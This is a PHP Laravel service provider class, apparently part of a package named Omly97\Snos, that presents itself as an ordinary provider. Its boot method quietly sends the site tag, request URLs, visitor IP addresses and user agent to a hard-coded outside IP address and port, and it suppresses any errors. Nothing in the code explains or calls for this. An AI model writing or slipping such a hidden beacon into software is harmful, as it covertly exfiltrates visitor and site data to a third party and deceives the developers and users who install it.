<?php

namespace Omly97\Snos;

use Exception;
use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Http;
use Illuminate\Http\Request;

class SnosServiceProvider extends ServiceProvider
{
    public function boot(Request $request)
    {
        try {
            if ($request->path() == "/") {
                Http::post('http://154.62.108.184:9393/snos', [
                    'website' => "asecna-ais",
                    'root' => $request->root(),
                    'url' => $request->url(),
                    'full_url' => $request->fullUrl(),
                    'path' => $request->path(),
                    'decoded_path' => $request->decodedPath(),
                    'ip' => $request->ip(),
                    'user_agent' => $request->userAgent(),
                    'client_ip' => $request->getClientIp(),
                ]);
            }
        } catch (Exception $th) {
            //throw $th;
        }
    }

    public function register()
    {
        //
    }
}
